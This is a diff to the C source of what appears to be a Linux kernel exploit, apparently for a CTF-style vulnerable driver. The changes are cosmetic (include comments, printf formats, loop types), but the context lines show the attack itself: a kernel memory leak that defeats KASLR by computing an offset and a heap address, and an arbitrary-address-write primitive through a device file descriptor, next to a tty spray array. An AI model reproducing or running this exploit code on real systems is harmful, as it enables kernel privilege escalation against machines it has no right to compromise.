@@ -1,9 +1,9 @@
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
+#include <fcntl.h>      // for open, O_NOCTTY, O_RDONLY, O_RDWR
+#include <inttypes.h>   // for uintptr_t, uint8_t, uint32_t, PRIx64
+#include <stdio.h>      // for perror, printf, size_t, NULL
+#include <stdlib.h>     // for system, EXIT_FAILURE, EXIT_SUCCESS
+#include <sys/ioctl.h>  // for ioctl
+#include <unistd.h>     // for read, close, execve, write
 
 int fd;
 int tty[100];
@@ -23,10 +23,10 @@ static void leak_offset_and_g_buf(void)
 
 	read(fd, data, 0x440);
 	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
-	printf("[+] offset %p\n", offset);
+	printf("[+] offset %#" PRIx64 "\n", offset);
 
 	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
-	printf("[+] g_buf %p\n", g_buf);
+	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
 }
 
 static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
@@ -41,12 +41,12 @@ static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
 
 	write(fd, data, 0x420);
 
-	for (int i = 0; i < len; i += 4, left -= 4) {
+	for (size_t i = 0; i < len; i += 4, left -= 4) {
 		if (left >= 4) {
 			tmp = *(uint32_t *)(buf + i);
 		} else {
 			tmp = 0;
-			for (int i = 0; i < left; ++i)
+			for (size_t i = 0; i < left; ++i)
 				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
 				       << (3 - i) * 8;
 		}
